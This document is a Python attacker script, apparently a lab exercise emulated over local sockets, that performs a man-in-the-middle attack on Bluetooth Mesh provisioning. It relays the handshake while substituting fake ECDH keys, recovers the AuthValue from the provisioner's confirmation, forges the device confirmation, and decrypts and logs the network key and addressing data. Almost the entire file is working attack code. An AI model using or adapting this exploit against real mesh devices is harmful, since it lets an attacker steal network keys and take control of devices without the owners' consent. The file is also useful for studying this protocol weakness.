#!/usr/bin/env python3
import logging
from pwn import *
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from toolbox import *
import select

# Create and configure logger
logger = logging.getLogger('attacker')
logger.setLevel(logging.DEBUG)  # Logger level

# Create console handler for INFO level
console_handler = logging.StreamHandler()
console_handler.setLevel(logging.INFO)
console_formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
console_handler.setFormatter(console_formatter)

# Add handlers to the logger
logger.addHandler(console_handler)

from Crypto.Cipher import AES

def generate_subkey(K):
    # Constants
    const_zero = bytes(16)  # 16 bytes of zero
    const_rb = 0x87

    # Step 1: Calculate L
    aes = AES.new(K, AES.MODE_ECB)  # Create AES ECB cipher with key K
    L = int.from_bytes(aes.encrypt(const_zero), 'big')  # Encrypt const_zero and convert to integer

    # Step 2: Generate K1
    if L >> 127 == 0:  # Check MSB of L
        K1 = (L << 1) & ((1 << 128) - 1)  # Left shift and ensure 128 bits
    else:
        K1 = ((L << 1) & ((1 << 128) - 1)) ^ const_rb  # Left shift, mod 128 bits, XOR const_Rb

    # Step 3: Generate K2
    if K1 >> 127 == 0:  # Check MSB of K1
        K2 = (K1 << 1) & ((1 << 128) - 1)  # Left shift and ensure 128 bits
    else:
        K2 = ((K1 << 1) & ((1 << 128) - 1)) ^ const_rb  # Left shift, mod 128 bits, XOR const_Rb

    return K1.to_bytes(16, 'big'), K2.to_bytes(16, 'big')  # Return K1 and K2 as 16-byte values

def aes_encrypt(key, data):
    """
    AES encryption (ECB mode)
    """
    cipher = AES.new(key, AES.MODE_ECB)
    return cipher.encrypt(data)

def aes_decrypt(key, data):
    """
    AES decryption (ECB mode)
    """
    cipher = AES.new(key, AES.MODE_ECB)
    return cipher.decrypt(data)


def fake_prov(s_dev, s_prov, data):
    #TODO
    if data[0:1] == BEACON_TYPE:
        global DeviceUUID
        # Captured DeviceUUID
        DeviceUUID = data[1:17]
        logger.info(f'Caputured DeviceUUID: {DeviceUUID.hex()}')
        s_prov.send(data)
    elif data[0:1] == LINK_ACK_OPCODE:
        logger.info(f'Caputured Link Ack Message: {data.hex()}')
        s_prov.send(data)
    elif data[0:1] == PROVISIONING_CAPABILITIES_OPCODE:
        global provisioning_capabilities
        provisioning_capabilities = data
        logger.info(f'Caputured Provisioning Capabilities: {data.hex()}')
        s_prov.send(data)
    elif data[0:1] == PROVISIONING_PUBLIC_KEY_OPCODE:
        logger.info(f'Caputured Device Public Key Pair: {data.hex()}')
        # Captured Public Key Pair
        global dev_public_key_x
        dev_public_key_x = data[1:33]
        global dev_public_key_y
        dev_public_key_y = data[33:65]

        # Fake Key Pair
        global fake_dev_private_key, fake_dev_public_key_x, fake_dev_public_key_y
        fake_dev_private_key, fake_dev_public_key_x, fake_dev_public_key_y = generate_key_pair()
        fake_dev_public_key_message = PROVISIONING_PUBLIC_KEY_OPCODE + fake_dev_public_key_x + fake_dev_public_key_y
        s_prov.send(fake_dev_public_key_message)
        logger.info(f'Sent Fake Device Public Key: {fake_dev_public_key_message.hex()}')
        global ECDHSecret_prov
        ECDHSecret_prov = derive_dhkey(fake_dev_private_key, prov_public_key_x, prov_public_key_y)
        logger.info(f'Derived DHKey for Provisioner: {ECDHSecret_prov.hex()}')
        
    elif data[0:1] == PROVISIONING_CONFIRMATION_OPCODE:
        # Send Confirmation right back to get Random
        logger.info(f'Captured Device Confirmation: {data.hex()}')
        s_dev.send(PROVISIONING_RANDOM_OPCODE + attacker_random)
        logger.info(f'Sent Attacker Random: {attacker_random.hex()}')

    elif data[0:1] == PROVISIONING_RANDOM_OPCODE:
        global dev_random
        dev_random = data[1:]

        logger.info(f'Captured Device Random: {data.hex()}')
        # Encrypt it again and send data to device
        confirmation_inputs = (
            provisioning_invite[1:] + 
            provisioning_capabilities[1:] + 
            provisioning_start[1:] +
            fake_prov_public_key_x + 
            fake_prov_public_key_y + 
            dev_public_key_x + 
            dev_public_key_y
        )
        confirmation_salt = s1(confirmation_inputs)
        provisioning_salt = s1(confirmation_salt + attacker_random + dev_random)
        session_key = k1(ECDHSecret_dev, provisioning_salt, b'prsk')
        nonce = k1(ECDHSecret_dev, provisioning_salt, b'prsn')
        session_nonce = nonce[-13:]
        encrypted_provisioning_data, provisioning_data_mic = aes_ccm_encrypt(session_key, session_nonce, provisioning_data)
        provisioning_data_pdu = PROVISIONING_DATA_OPCODE + encrypted_provisioning_data + provisioning_data_mic
        s_dev.send(provisioning_data_pdu)
        logger.info(f'Sent Provisioning Info: {provisioning_data_pdu.hex()}')

    elif data[0:1] == PROVISIONING_COMPLETE_OPCODE:
        complete_message = PROVISIONING_COMPLETE_OPCODE
        s_prov.send(complete_message)
        logger.info('Sent Complete Message')
        s_dev.send(LINK_CLOSE_OPCODE + b'\x00')
        logger.info('Sent Close Message')

    pass

def fake_dev(s_dev, s_prov, data):
    if data == LINK_OPEN_OPCODE + DeviceUUID:
        logger.info(f'Captured Link Open Message: {data.hex()}')
        s_dev.send(data)

    elif data[0:1] == PROVISIONING_INVITE_OPCODE:
        global provisioning_invite
        provisioning_invite = data
        logger.info(f'Caputured Provisioning Invite Message: {data.hex()}')
        s_dev.send(data)

    elif data[0:1] == PROVISIONING_START_OPCODE:
        global provisioning_start
        provisioning_start = data
        logger.info(f'Caputured Provisioning Start Message: {data.hex()}')
        s_dev.send(data)

    elif data[0:1] == PROVISIONING_PUBLIC_KEY_OPCODE:
        logger.info(f'Caputured Provisioner Public Key Pair: {data.hex()}')
        # Captured Public Key Pair
        global prov_public_key_x
        prov_public_key_x = data[1:33]
        global prov_public_key_y
        prov_public_key_y = data[33:65]

        # Fake Key Pair
        global fake_prov_private_key, fake_prov_public_key_x, fake_prov_public_key_y
        fake_prov_private_key, fake_prov_public_key_x, fake_prov_public_key_y = generate_key_pair()
        fake_public_key_message = PROVISIONING_PUBLIC_KEY_OPCODE + fake_prov_public_key_x + fake_prov_public_key_y
        s_dev.send(fake_public_key_message)
        logger.info(f'Sent Fake Provisioner Public Key: {fake_public_key_message.hex()}')

    elif data[0:1] == PROVISIONING_CONFIRMATION_OPCODE:
        # Send Attacker Confirmation to Provisioner
        global provisioner_confirmation
        provisioner_confirmation = data[1:]
        logger.info(f'Captured Provisioner Confirmation: {data.hex()}')
        # Send Confirmation right back to get Random
        s_prov.send(data)

        # Fake ECDHSecret for Device
        global ECDHSecret_dev
        ECDHSecret_dev = derive_dhkey(fake_prov_private_key, dev_public_key_x, dev_public_key_y)
        logger.info(f'Derived DHKey for Device: {ECDHSecret_dev.hex()}')
    
    elif data[0:1] == PROVISIONING_RANDOM_OPCODE:
        global prov_random
        s_prov.send(data)
        prov_random = data[1:]
        logger.info(f'Captured Provisioner Random: {prov_random.hex()}')

        global dev_confirmation_inputs
        dev_confirmation_inputs = (
            provisioning_invite[1:] + 
            provisioning_capabilities[1:] + 
            provisioning_start[1:] +
            prov_public_key_x + 
            prov_public_key_y + 
            fake_dev_public_key_x + 
            fake_dev_public_key_y
        )
        global prov_confirmation_salt
        prov_confirmation_salt = s1(dev_confirmation_inputs)
        prov_confirmation_key = k1(ECDHSecret_prov, prov_confirmation_salt, b"prck")
        logger.info(f'Computed Confirmation Key for Provisioner: {prov_confirmation_key.hex()}')

        auth_value_todo = aes_decrypt(prov_confirmation_key, provisioner_confirmation)
        ck1, _ = generate_subkey(prov_confirmation_key)
        aes_N = aes_encrypt(prov_confirmation_key, prov_random)
        global auth_value
        auth_value = bytes([a ^ b ^ c for a, b, c in zip(auth_value_todo, aes_N, ck1)])
        logger.info(f'Computed Auth Value: {auth_value.hex()}')

        # Generate attacker confirmation to device
        global attacker_random
        attacker_random = get_random_bytes(16)  # Generate random value
        global prov_confirmation_inputs
        prov_confirmation_inputs = (
            provisioning_invite[1:] + 
            provisioning_capabilities[1:] + 
            provisioning_start[1:] +
            fake_prov_public_key_x + 
            fake_prov_public_key_y + 
            dev_public_key_x + 
            dev_public_key_y
        )
        dev_confirmation_salt = s1(prov_confirmation_inputs)
        dev_confirmation_key = k1(ECDHSecret_dev, dev_confirmation_salt, b"prck")
        logger.info(f'Computed Confirmation Key for Device: {dev_confirmation_key.hex()}')
        attacker_confirmation = aes_cmac(dev_confirmation_key, attacker_random + auth_value)
        attacker_confirmation_message = PROVISIONING_CONFIRMATION_OPCODE + attacker_confirmation
        s_dev.send(attacker_confirmation_message)
        logger.info(f'Sent Attacker Confirmation: {attacker_confirmation_message.hex()}')

    elif data[0:1] == PROVISIONING_DATA_OPCODE:
        provisioning_salt = s1(prov_confirmation_salt + prov_random + prov_random)
        session_key = k1(ECDHSecret_prov, provisioning_salt, b'prsk')
        nonce = k1(ECDHSecret_prov, provisioning_salt, b'prsn')
        session_nonce = nonce[-13:]
        cipher = AES.new(session_key, AES.MODE_CCM, nonce=session_nonce, mac_len=8)

        encrypted_provisioning_data = data[1:-8]
        provisioning_data_mic = data[-8:]

        try:
            # Decrypt the provisioning data
            global provisioning_data
            provisioning_data = cipher.decrypt_and_verify(encrypted_provisioning_data, provisioning_data_mic)
            logger.info(f'Decrypted Provisioning Data: {provisioning_data.hex()}')
            logger.info(f'NetWorkKey: {provisioning_data[0:16].hex()}')
            logger.info(f'KeyIndex: {provisioning_data[16:18].hex()}')
            logger.info(f'Flags: {provisioning_data[18:19].hex()}')
            logger.info(f'IVIndex: {provisioning_data[19:23].hex()}')
            logger.info(f'UnicastAddress: {provisioning_data[23:25].hex()}')
        except ValueError as e:
            logger.error("Provisioning Data Decryption Failed")
            raise e

    elif data[0:1] == LINK_CLOSE_OPCODE:
        logger.info('Link Closed')

    #TODO
    pass

def sniff():
    # Attacker acts as the middle man, she can sniff and modify all the data between the initiator and the responder
    # To emulate this, the attacker connects to the provisioner and the device to relay the data between them.
    prov_host = '127.0.0.1'
    prov_port = 65432
    prov_conn = remote(prov_host, prov_port)

    dev_host = '127.0.0.1'
    dev_port = 65433
    server = listen(dev_port, bindaddr=dev_host)
    dev_conn = server.wait_for_connection()

    sockets = [dev_conn, prov_conn]

    while True:
        readable, _, _ = select.select(sockets, [], [])
        for s in readable:
            if s == dev_conn:
                data = dev_conn.recv()
                fake_prov(dev_conn, prov_conn, data)
            elif s == prov_conn:
                data = prov_conn.recv()
                fake_dev(dev_conn, s, data)


if __name__ == "__main__":
    sniff()